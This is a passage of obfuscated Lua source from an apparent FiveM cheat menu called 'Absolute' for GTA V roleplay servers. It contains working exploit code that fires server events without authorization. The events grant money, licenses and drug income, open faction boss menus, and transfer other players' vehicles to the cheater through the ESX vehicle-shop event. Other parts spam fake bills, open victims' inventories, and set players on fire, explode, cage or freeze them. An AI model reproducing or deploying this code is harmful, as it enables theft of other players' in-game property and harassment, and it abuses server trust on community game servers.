                        local UxMhSifNoljjkqjsFsJvh =
                            kbinput("Enter the money to reduce(remember to be careful with this)", " ", 20)
                        FuckerTriggerCustomEvent(true, "esx_dmvschool:pay", UxMhSifNoljjkqjsFsJvh)
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ESXMisc") then
                if Absolute.Button("Set Hunger/Thirst to 100%") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
                elseif Absolute.Button("Weapon license") then
                    TriggerServerEvent("dmv:success")
                    TriggerServerEvent("esx_weashopjob:addLicense", "tazer")
                    TriggerServerEvent("esx_weashopjob:addLicense", "ppa")
                    TriggerServerEvent("esx_weashopjob:addLicense", "ppa2")
                elseif Absolute.Button("Vehicles Licenses") then
                    TriggerServerEvent("dmv:success")
                    TriggerServerEvent("esx_dmvschool:addLicense", "dmv")
                    TriggerServerEvent("esx_dmvschool:addLicense", "drive")
                    TriggerServerEvent("esx_dmvschool:addLicense", "drive_bike")
                    TriggerServerEvent("esx_dmvschool:addLicense", "drive_truck")
                    TriggerServerEvent("esx_airlines:addLicense", "helico")
                    TriggerServerEvent("esx_airlines:addLicense", "avion")
                    TriggerServerEvent("esx_weashopjob:addLicense", "drive_bike")
                    TriggerServerEvent("esx_weashopjob:addLicense", "drive_truck")
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ESXDrugs") then
                if
                    Absolute.ComboBox(
                        "Harvest",
                        {"Weed", "Coke", "Meth", "Opium"},
                        currESXHarvestingFuncIndex,
                        selESXHarvestingFuncIndex,
                        function(ZJZEKdr, oEUwKw)
                            currESXHarvestingFuncIndex = ZJZEKdr
                            selESXHarvestingFuncIndex = ZJZEKdr
                        end
                    )
                 then
                    if selESXHarvestingFuncIndex == 1 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startHarvestWeed")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startHarvestWeed")
                        FuckerTriggerCustomEvent(true, "esx_drugs:pickedUpCannabis")
                    elseif selESXHarvestingFuncIndex == 2 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startHarvestCoke")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startHarvestCoke")
                    elseif selESXHarvestingFuncIndex == 3 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startHarvestMeth")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startHarvestMeth")
                    elseif selESXHarvestingFuncIndex == 4 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startHarvestOpium")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startHarvestOpium")
                    end
                elseif
                    Absolute.ComboBox(
                        "Transform",
                        {"Weed", "Coke", "Meth", "Opium"},
                        currESXTransformFuncIndex,
                        selESXTransformFuncIndex,
                        function(YkOrkJoJaJrYV6O99, JCIpGnZop)
                            currESXTransformFuncIndex = YkOrkJoJaJrYV6O99
                            selESXTransformFuncIndex = YkOrkJoJaJrYV6O99
                        end
                    )
                 then
                    if selESXTransformFuncIndex == 1 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startTransformWeed")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startTransformWeed")
                        FuckerTriggerCustomEvent(true, "esx_drugs:processCannabis")
                    elseif selESXTransformFuncIndex == 2 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startTransformCoke")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startTransformCoke")
                    elseif selESXTransformFuncIndex == 3 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startTransformMeth")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startTransformMeth")
                    elseif selESXTransformFuncIndex == 4 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startTransformOpium")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startTransformOpium")
                    end
                elseif
                    Absolute.ComboBox(
                        "Sell",
                        {"Weed", "Coke", "Meth", "Opium"},
                        currESXSellFuncIndex,
                        selESXSellFuncIndex,
                        function(siTjI7, nxuxQYynL6)
                            currESXSellFuncIndex = siTjI7
                            selESXSellFuncIndex = siTjI7
                        end
                    )
                 then
                    if selESXSellFuncIndex == 1 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startSellWeed")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startSellWeed")
                        FuckerTriggerCustomEvent(true, "esx_drugs:SellCannabis")
                    elseif selESXSellFuncIndex == 2 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startSellCoke")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startSellCoke")
                    elseif selESXSellFuncIndex == 3 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startSellMeth")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startSellMeth")
                    elseif selESXSellFuncIndex == 4 then
                        FuckerTriggerCustomEvent(true, "esx_drugs:startSellOpium")
                        FuckerTriggerCustomEvent(true, "esx_illegal_drugs:startSellOpium")
                    end
                elseif Absolute.Button("Stop") then
                    FuckerTriggerCustomEvent(true, "esx_drugs:stopHarvestWeed")
                    FuckerTriggerCustomEvent(true, "esx_illegal_drugs:stopHarvestWeed")
                    FuckerTriggerCustomEvent(true, "esx_drugs:pickedUpCannabis")
                    FuckerTriggerCustomEvent(true, "esx_drugs:stopTransformWeed")
                    FuckerTriggerCustomEvent(true, "esx_illegal_drugs:stopTransformWeed")
                    FuckerTriggerCustomEvent(true, "esx_drugs:processCannabis")
                    FuckerTriggerCustomEvent(true, "esx_drugs:stopHarvestOpium")
                    FuckerTriggerCustomEvent(true, "esx_illegal_drugs:stopHarvestOpium")
                    FuckerTriggerCustomEvent(true, "esx_drugs:stopTransformOpium")
                    FuckerTriggerCustomEvent(true, "esx_illegal_drugs:stopTransformOpium")
                    FuckerTriggerCustomEvent(true, "esx_drugs:stopHarvestMeth")
                    FuckerTriggerCustomEvent(true, "esx_illegal_drugs:stopHarvestMeth")
                    FuckerTriggerCustomEvent(true, "esx_drugs:stopTransformMeth")
                    FuckerTriggerCustomEvent(true, "esx_illegal_drugs:stopTransformMeth")
                    FuckerTriggerCustomEvent(true, "esx_drugs:stopHarvestCoke")
                    FuckerTriggerCustomEvent(true, "esx_illegal_drugs:stopHarvestCoke")
                    FuckerTriggerCustomEvent(true, "esx_drugs:stopTransformCoke")
                    FuckerTriggerCustomEvent(true, "esx_illegal_drugs:stopTransformCoke")
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("Jobspanel") then
                if Absolute.Button("Mechanic Boss Menu") then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "mecano",
                        function(DeU89nB6d6I7S72, GFA3rbtD55)
                            GFA3rbtD55.close()
                        end
                    )
                    u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
                elseif Absolute.Button("Police Boss Menu") then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "police",
                        function(imv1QH6r, XuoqPzh9hriRHUsug1)
                            XuoqPzh9hriRHUsug1.close()
                        end
                    )
                    u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
                elseif Absolute.Button("Ambulance Boss Menu") then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "ambulance",
                        function(skde_4lPeB3v, pu)
                            pu.close()
                        end
                    )
                    u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
                elseif Absolute.Button("Taxi Boss Menu") then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "taxi",
                        function(cpxrW6pEv7U, VaGLHYddxa8VDMyncE5)
                            VaGLHYddxa8VDMyncE5.close()
                        end
                    )
                    u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
                elseif Absolute.Button("Mafia Boss Menu") then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "mafia",
                        function(A, tLMq)
                            tLMq.close()
                        end
                    )
                    u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
                elseif Absolute.Button("Cartel Boss Menu") then
                    TriggerEvent(
                        "esx_society:openBossMenu",
                        "cartel",
                        function(ecnzO_Pf9Cw8e1, AoZulCu)
                            AoZulCu.close()
                        end
                    )
                    u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("VRPRecovery") then
                if Absolute.Button("Get Driving License", "⚠️") then
                    FuckerTriggerCustomEvent(true, "dmv:success")
                elseif Absolute.Button("Bank Deposit") then
                    local Z = kbinput("Enter amount of money", "⚠️", 12)
                    if Z ~= " " then
                        TriggerCustomEvent(true, "Banca:deposit", Z)
                        TriggerCustomEvent(true, "bank:deposit", Z)
                    end
                elseif Absolute.Button("Bank Withdraw", "⚠️") then
                    local sf4vV = kbinput("Enter amount of money", " ", 12)
                    if sf4vV ~= " " then
                        TriggerCustomEvent(true, "bank:withdraw", sf4vV)
                        TriggerCustomEvent(true, "Banca:withdraw", sf4vV)
                    end
                elseif Absolute.Button("Slot Machine", "⚠️") then
                    local pJc1YgHbWeKyS91jDX = kbinput("Enter amount of money", " ", 12)
                    if pJc1YgHbWeKyS91jDX ~= " " then
                        TriggerCustomEvent(true, "vrp_slotmachine:server:2", pJc1YgHbWeKyS91jDX)
                    end
                elseif Absolute.Button("Handcuffs", "ON/OFF") then
                    vRP.toggleHandcuff()
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ServerResourceList") then
                for i = 0.0, #Id1tlEeyGa2CC do
                    if Absolute.Button(Id1tlEeyGa2CC[i]) then
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("ESXItems") then
                if
                    Absolute.ComboBox(
                        "Job Items",
                        Jobs.Item,
                        C6FFwY4tZ2K1_nr,
                        TJ,
                        function(PjFaQXjnTMk0pP, A4Qb_dV_77atZrZ_aezK)
                            C6FFwY4tZ2K1_nr = PjFaQXjnTMk0pP
                            TJ = PjFaQXjnTMk0pP
                        end
                    )
                 then
                    ESXItemExpliot()
                elseif
                    Absolute.ComboBox(
                        "Other Items",
                        CustomItems.Item,
                        skUTM47s1u_OJ7,
                        yJ1LbRvZem,
                        function(Ww8m, siCJFBbi7wGP2nhPiGz)
                            skUTM47s1u_OJ7 = Ww8m
                            yJ1LbRvZem = Ww8m
                        end
                    )
                 then
                    ESXCustomItemsExploit()
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("PlayerList") then
                for i = 0.0, 128 do
                    if
                        NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0.0 and
                            Absolute.MenuButton(
                                "[~b~" ..
                                    GetPlayerServerId(i) ..
                                        "~w~]" ..
                                            (IsPedDeadOrDying(GetPlayerPed(i), 1) and " ~w~[~r~-~w~]" or
                                                " ~w~[~g~+~w~] ") ..
                                                GetPlayerName(i),
                                "PlayerOptionsMenu"
                            )
                     then
                        SelectedPlayer = i
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("PlayerOptionsMenu") then
                Absolute.SetSubTitle(
                    "PlayerOptionsMenu",
                    "~b~[" .. GetPlayerServerId(SelectedPlayer) .. "]~s~ " .. GetPlayerName(SelectedPlayer)
                )
                if
                    Absolute.MenuButton(
                        "Pokemon Duel",
                        "PokemonConfig",
                        "~o~>>",
                        {dict = "mpleaderboard", text = "leaderboard_time_icon", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Troll Options",
                        "PlayerTrollOptions",
                        "~o~>>",
                        {dict = "commonmenutu", text = "last_team_standing", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.MenuButton(
                        "Give Single Weapon",
                        "WeaponTypesForSelectedPlayer",
                        "~o~>>",
                        {dict = "commonmenutu", text = "capture_the_flag", color = {r = 255, g = 255, b = 255}}
                    )
                 then
                elseif
                    Absolute.Button(
                        "Spectate",
                        isSpectatingTarget and "SPECTATING ~b~" .. GetPlayerName(SelectedPlayer)
                    )
                 then
                    SpectateUser(SelectedPlayer)
                elseif
                    Absolute.ComboBox(
                        "Misc Options",
                        {
                            "Teleport To",
                            "Clone Outfit",
                            "Spawn Vehicle",
                            "Tp to Vehicle",
                            "Give All weapons",
                            "Remove all weapons",
                            "~g~ ESX ~s~| Steal His vehicle",
                            "~g~ ESX ~s~| Give your vehicle"
                        },
                        currMiscPlayerFuncIndex,
                        selMiscPlayerFuncIndex,
                        function(rzUeawRZIbc, jCCD)
                            currMiscPlayerFuncIndex = rzUeawRZIbc
                            selMiscPlayerFuncIndex = rzUeawRZIbc
                        end
                    )
                 then
                    local _XPWu = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                    if selMiscPlayerFuncIndex == 1 then
                        SetEntityCoords(PlayerPedId(), GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    elseif selMiscPlayerFuncIndex == 2 then
                        Absolute_function.CloneOutfit(SelectedPlayer)
                    elseif selMiscPlayerFuncIndex == 3 then
                        local n4i9CZtr7nDR5QkLHZo = GetPlayerPed(SelectedPlayer)
                        local qam1Yos4 = kbinput("Enter Vehicle Spawn Name", " ", 20)
                        if qam1Yos4 and IsModelValid(qam1Yos4) and IsModelAVehicle(qam1Yos4) then
                            RequestModel(qam1Yos4)
                            while not HasModelLoaded(qam1Yos4) do
                                Citizen.Wait(0.0)
                            end
                            local v6tz8cIrCl1QN0h3asIWY =
                                CreateVehicle(
                                GetHashKey(qam1Yos4),
                                GetEntityCoords(n4i9CZtr7nDR5QkLHZo),
                                GetEntityHeading(n4i9CZtr7nDR5QkLHZo) + 90,
                                true,
                                true
                            )
                            FullTunningCar(v6tz8cIrCl1QN0h3asIWY)
                        else
                            I0oW9H("~b~Model is not valid!", true)
                        end
                    elseif selMiscPlayerFuncIndex == 4 then
                        TeleportIntoPlayerVehicle(SelectedPlayer)
                    elseif selMiscPlayerFuncIndex == 5 then
                        GiveAllWeapons(PlayerPedId(SelectedPlayer))
                    elseif selMiscPlayerFuncIndex == 6 then
                        RequestControlOnce(GetPlayerPed(selectedPlayer))
                        RemoveAllPedWeapons(GetPlayerPed(selectedPlayer), true)
                        RemoveAllPedWeapons(GetPlayerPed(selectedPlayer), false)
                    elseif selMiscPlayerFuncIndex == 7 then
                        if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer)) then
                            local SOfnk5AL = GetVehiclePedIsIn(PlayerPedId(SelectedPlayer), 0.0)
                            local GLfO6zaiCj2TBlVK =
                                GetVehicleProperties(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false))
                            local Ax28zC0AmPJ0 = GLfO6zaiCj2TBlVK.model
                            local F = GetDisplayNameFromVehicleModel(Ax28zC0AmPJ0)
                            FuckerTriggerCustomEvent(
                                true,
                                "esx_vehicleshop:setVehicleOwnedPlayerId",
                                GetPlayerServerId(PlayerId()),
                                GLfO6zaiCj2TBlVK,
                                F,
                                Ax28zC0AmPJ0,
                                false
                            )
                            I0oW9H("Go to the inpound for your new car!!!")
                        end
                    elseif selMiscPlayerFuncIndex == 8 then
                        local uWsD7QSOe = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                        local jH92T4rQzzdk7oN = GetVehicleProperties(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                        local oB1CyuX4TmibyDP9i = jH92T4rQzzdk7oN.model
                        local Z = GetDisplayNameFromVehicleModel(oB1CyuX4TmibyDP9i)
                        FuckerTriggerCustomEvent(
                            true,
                            "esx_vehicleshop:setVehicleOwnedPlayerId",
                            GetPlayerServerId(PlayerId(SelectedPlayer)),
                            jH92T4rQzzdk7oN,
                            Z,
                            oB1CyuX4TmibyDP9i,
                            false
                        )
                        I0oW9H("Vehicle added to SQL, get it on impound")
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("WeaponTypesForSelectedPlayer") then
                for cvYUsnTJju, wkwVS in pairs(ntvgfjj9ht7Z) do
                    if Absolute.MenuButton(" " .. cvYUsnTJju, "WeaponTypeSelectionToPlayer", "~o~>>") then
                        dy = wkwVS
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("WeaponTypeSelectionToPlayer") then
                for h1X1TzFttiKvN7eMlGpxP, LemTVpnhgM in pairs(dy) do
                    if Absolute.MenuButton(LemTVpnhgM.name, "WeaponOptionsToPlayer", "~o~>>") then
                        weapontoplayer = LemTVpnhgM
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("WeaponOptionsToPlayer") then
                if Absolute.Button("Spawn Weapon") then
                    local Z = GetHashKey(weapontoplayer.id)
                    BR_BkvC9lTdDDJ(Z)
                    BR_BkvC9lTdDDJ(weapontoplayer.id)
                    GiveWeaponToPed(GetPlayerPed(SelectedPlayer), Z, 100, true, false)
                elseif Absolute.Button("Remove Weapon") then
                    RemoveWeaponFromPed(GetPlayerPed(SelectedPlayer), GetHashKey(dk.id))
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("PokemonConfig") then
                if Absolute.CheckBox("Pokemon Duel", PokemonGO) then
                    PokemonGO = not PokemonGO
                elseif
                    Absolute.ComboBox(
                        "Poke Attack",
                        {"RPG", "AK-47", "ASSAULT SHOTGUN", "LASER CARABINE", "MINIGUN", "RAILGUN"},
                        currPokeAttackFuncIndex,
                        selPokeAttackFuncIndex,
                        function(L62, rYtH4IluJw1b)
                            currPokeAttackFuncIndex = L62
                            selPokeAttackFuncIndex = L62
                        end
                    )
                 then
                    if selPokeAttackFuncIndex == 1 then
                        selectedpokeweap = "weapon_rpg"
                    elseif selPokeAttackFuncIndex == 2 then
                        selectedpokeweap = "weapon_assaultrifle"
                    elseif selPokeAttackFuncIndex == 3 then
                        selectedpokeweap = "weapon_assaultshotgun"
                    elseif selPokeAttackFuncIndex == 4 then
                        selectedpokeweap = "weapon_raycarbine"
                    elseif selPokeAttackFuncIndex == 5 then
                        selectedpokeweap = "weapon_minigun"
                    elseif selPokeAttackFuncIndex == 6 then
                        selectedpokeweap = "weapon_railgun"
                    end
                elseif
                    Absolute.ComboBox(
                        "PokePed",
                        {"Sylvester Stallone", "COP", "WARLUS", "CHIMP", "POGO", "ALIEN", "DITO"},
                        currPokePedFuncIndex,
                        selPokePedFuncIndex,
                        function(b6WUbLwdvRvhyaa, _uLios)
                            currPokePedFuncIndex = b6WUbLwdvRvhyaa
                            selPokePedFuncIndex = b6WUbLwdvRvhyaa
                        end
                    )
                 then
                    if selPokePedFuncIndex == 1 then
                        selectedpokeped = "u_m_y_babyd"
                    elseif selPokePedFuncIndex == 2 then
                        selectedpokeped = "s_m_y_cop_01"
                    elseif selPokePedFuncIndex == 3 then
                        selectedpokeped = "a_f_m_fatcult_01"
                    elseif selPokePedFuncIndex == 4 then
                        selectedpokeped = "a_c_chimp"
                    elseif selPokePedFuncIndex == 5 then
                        selectedpokeped = "u_m_y_pogo_01"
                    elseif selPokePedFuncIndex == 6 then
                        selectedpokeped = "s_m_m_movalien_01"
                    elseif selPokePedFuncIndex == 7 then
                        local UZ6S71dnr = GetPlayerPedScriptIndex(GetPlayerPed(selectedPlayer))
                        selectedpokeped = UZ6S71dnr
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("PlayerTrollOptions") then
                if Absolute.MenuButton("Object Attacher", "TrollObjectAttacher", "~o~>>") then
                elseif
                    Absolute.ComboBox(
                        "Some Troll Options",
                        {"Clone Ped", "~g~ESX ~s~| Open Inventory", "Fire", "Explode", "Shake Cam", "Cage"},
                        currTrollPlayerFuncIndex,
                        selTrollPlayerFuncIndex,
                        function(D0cPJi7uCxYlu, j5k07blm4lXz5a)
                            currTrollPlayerFuncIndex = D0cPJi7uCxYlu
                            selTrollPlayerFuncIndex = D0cPJi7uCxYlu
                        end
                    )
                 then
                    if selTrollPlayerFuncIndex == 1 then
                        ClonePedFromPlayer(SelectedPlayer)
                    elseif selTrollPlayerFuncIndex == 2 then
                        FuckerTriggerCustomEvent(
                            false,
                            "esx_inventoryhud:openPlayerInventory",
                            GetPlayerServerId(SelectedPlayer),
                            GetPlayerName(SelectedPlayer)
                        )
                    elseif selTrollPlayerFuncIndex == 3 then
                        for i = 0.0, 15 do
                            jUHKCaIBnhX(3, 5, true, false)
                        end
                    elseif selTrollPlayerFuncIndex == 4 then
                        for i = 0.0, 15 do
                            jUHKCaIBnhX(5, 5, true, false)
                        end
                    elseif selTrollPlayerFuncIndex == 5 then
                        for i = 0.0, 15 do
                            jUHKCaIBnhX(5, 1000000, false, true)
                        end
                    elseif selTrollPlayerFuncIndex == 6 then
                        CagePlayer()
                    end
                elseif
                    Absolute.ComboBox(
                        "Pop Tire",
                        {"Front Left", "Front Right", "Back Left", "Back Right", "All"},
                        currTireIndex,
                        selTireIndex,
                        function(FrpZpUE, dwOe30G2r)
                            currTireIndex = FrpZpUE
                            selTireIndex = FrpZpUE
                        end
                    )
                 then
                    if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0.0) then
                        ShowInfo("~r~Player Not In Vehicle!")
                    else
                        local DHwaOB32tNoP = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0.0)
                        RequestControlOnce(DHwaOB32tNoP)
                        if selTireIndex == 1 then
                            SetVehicleTyreBurst(DHwaOB32tNoP, 0.0, 1, nlXCUGaxh(1000))
                        elseif selTireIndex == 2 then
                            SetVehicleTyreBurst(DHwaOB32tNoP, 1, 1, nlXCUGaxh(1000))
                        elseif selTireIndex == 3 then
                            SetVehicleTyreBurst(DHwaOB32tNoP, 4, 1, nlXCUGaxh(1000))
                        elseif selTireIndex == 4 then
                            SetVehicleTyreBurst(DHwaOB32tNoP, 5, 1, nlXCUGaxh(1000))
                        elseif selTireIndex == 5 then
                            for i = 0.0, 7 do
                                SetVehicleTyreBurst(DHwaOB32tNoP, i, 1, nlXCUGaxh(1000))
                            end
                        end
                    end
                elseif Absolute.CheckBox("Freeze", PlayerFreeze) then
                    PlayerFreeze = not PlayerFreeze
                elseif Absolute.CheckBox("Disable Vehicle", DisableSelectedVeh) then
                    DisableSelectedVeh = not DisableSelectedVeh
                elseif Absolute.Button("Kick of vehicle") then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif Absolute.Button("Send patrol") then
                    Absolute_function.PolicePursuit(SelectedPlayer)
                elseif Absolute.Button("~g~ESX ~s~| Send bill") then
                    local KjPZwRB0pNFhhxUr6l = kbinput("How much bills:", " ", 20)
                    if KjPZwRB0pNFhhxUr6l then
                        for k = 1, KjPZwRB0pNFhhxUr6l do
                            FuckerTriggerCustomEvent(
                                true,
                                "esx_billing:sendBill",
                                GetPlayerServerId(SelectedPlayer),
                                "Absolute",
                                "fuckerino your asserino",
                                1000000
                            )
                        end
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("TrollObjectAttacher") then
                if
                    Absolute.ComboBox(
                        "Attacherino Flagerino",
                        H,
                        currentFlagSelection,
                        selectedFlagSelection,
                        function(_6oVBIi6tQJOrlbx, Q8C95kM5q6sa)
                            currentFlagSelection = _6oVBIi6tQJOrlbx
                            selectedFlagSelection = Q8C95kM5q6sa
                            FlagToAttach = nrZOlvFbKEc[selectedFlagSelection]
                        end
                    )
                 then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local kAQVB5hpg = FlagToAttach
                        local jVk7FKeuAr7LCRsAbjLo = GetHashKey(kAQVB5hpg)
                        while not HasModelLoaded(jVk7FKeuAr7LCRsAbjLo) do
                            Citizen.Wait(0.0)
                            RequestModel(jVk7FKeuAr7LCRsAbjLo)
                        end
                        local f6EbiP6rZc5Y2qOOk6cU = CreateObject(jVk7FKeuAr7LCRsAbjLo, 0.0, 0.0, 0.0, true, true, true)
                        AttachEntityToEntity(
                            f6EbiP6rZc5Y2qOOk6cU,
                            GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"),
                            0.0,
                            0.0,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            0.0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local XY_6Ef8XnW8Pn5NcKu = FlagToAttach
                        local aESOLmnO9FbIxiRg = GetHashKey(XY_6Ef8XnW8Pn5NcKu)
                        while not HasModelLoaded(aESOLmnO9FbIxiRg) do
                            Citizen.Wait(0.0)
                            RequestModel(aESOLmnO9FbIxiRg)
                        end
                        local JYY4p91fCOElLL = CreateObject(aESOLmnO9FbIxiRg, 0.0, 0.0, 0.0, true, true, true)
                        AttachEntityToEntity(
                            JYY4p91fCOElLL,
                            GetPlayerPed(SelectedPlayer),
                            GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0.0),
                            0.0,
                            0.0,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            0.0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                elseif
                    Absolute.ComboBox(
                        "Attacherino 	Properinos",
                        z0qe6BmtTrktvUWixnIC,
                        currentPlayerPropSelection,
                        selectedPlayerPropSelection,
                        function(OCKPg8ljk68BFDUXzFs, p)
                            currentPlayerPropSelection = OCKPg8ljk68BFDUXzFs
                            selectedPlayerPropSelection = p
                            PropToAttach = h[selectedPlayerPropSelection]
                        end
                    )
                 then
                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        local xultT333MPbA6IFHgK = PropToAttach
                        local Ns9nUf2e = GetHashKey(xultT333MPbA6IFHgK)
                        while not HasModelLoaded(Ns9nUf2e) do
                            Citizen.Wait(0.0)
                            RequestModel(Ns9nUf2e)
                        end
                        local WShSrMv2I6v4pWTd5 = CreateObject(Ns9nUf2e, 0.0, 0.0, 0.0, true, true, true)
                        AttachEntityToEntity(
                            WShSrMv2I6v4pWTd5,
                            GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"),
                            0.0,
                            0.0,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            0.0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local bPsZCwV5bdffj = PropToAttach
                        local Y65TNM5xzPdB9 = GetHashKey(bPsZCwV5bdffj)
                        while not HasModelLoaded(Y65TNM5xzPdB9) do
                            Citizen.Wait(0.0)
                            RequestModel(Y65TNM5xzPdB9)
                        end
                        local XgYBkN = CreateObject(Y65TNM5xzPdB9, 0.0, 0.0, 0.0, true, true, true)
                        AttachEntityToEntity(
                            XgYBkN,
                            GetPlayerPed(SelectedPlayer),
                            GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0.0),
                            0.0,
                            0.0,
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            nlXCUGaxh(0.0),
                            0.0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("Powers") then
                if Absolute.MenuButton("Movement Powers", "VelocityPowers", "~o~>>") then
                elseif Absolute.MenuButton("GodMode Types", "GmOptions", "~o~>>") then
                elseif Absolute.MenuButton("Super Heores", "SuperHeroesPowers", "~o~>>") then
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("SuperHeroesPowers") then
                if Absolute.CheckBox("Ant-Man", BecomeTiny) then
                    BecomeTiny = not BecomeTiny
                elseif
                    Absolute.CheckBox(
                        "Magneto",
                        magnet,
                        function(bvbeTz)
                            jEvLrNnRtR5tIHE38l24()
                        end
                    )
                 then
                elseif Absolute.CheckBox("Frozono", FrozeWalking) then
                    FrozeWalking = not FrozeWalking
                elseif Absolute.CheckBox("HULK", HulkMode) then
                    HulkMode = not HulkMode
                elseif Absolute.CheckBox("Iron Fist", IronFist) then
                    IronFist = not IronFist
                elseif Absolute.CheckBox("Fire Breath", FireBreath) then
                    FireBreath = not FireBreath
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("GmOptions") then
                if Absolute.CheckBox("Semi-GodMode", SemiGod) then
                    SemiGod = not SemiGod
                elseif Absolute.CheckBox("Godmode", GodmodeSelf) then
                    GodmodeSelf = not GodmodeSelf
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("VelocityPowers") then
                if
                    Absolute.ComboBoxSlider(
                        "Walking/running Multiplier",
                        FastCBWords,
                        currFastRunIndex,
                        selFastRunIndex,
                        function(wyRRySNKlvqRV, CeNDpl)
                            currFastRunIndex = wyRRySNKlvqRV
                            selFastRunIndex = wyRRySNKlvqRV
                            FastRunMultiplier = FastCB[wyRRySNKlvqRV]
                            SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
                        end
                    )
                 then
                elseif
                    Absolute.ComboBoxSlider(
                        "Fast Swim",
                        FastCBWords,
                        currFastSwimIndex,
                        selFastSwimIndex,
                        function(GqcP, Igw)
                            currFastSwimIndex = GqcP
                            selFastSwimIndex = GqcP
                            FastSwimMultiplier = FastCB[GqcP]
                            SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
                        end
                    )
                 then
                elseif Absolute.CheckBox("Super Jump", SuperJump) then
                    SuperJump = not SuperJump
                elseif Absolute.CheckBox("Invisibe Man", Invisibility) then
                    Invisibility = not Invisibility
                    if not Invisibility then
                        SetEntityVisible(PlayerPedId(), true)
                    end
                end
                Absolute.Display()
            elseif Absolute.IsMenuOpened("WardobeMaker") then
                if Absolute.MenuButton("Head Props", "HeadMenu", "~o~>>") then
                elseif Absolute.MenuButton("Torso Options", "TorsoMaker", "~o~>>") then
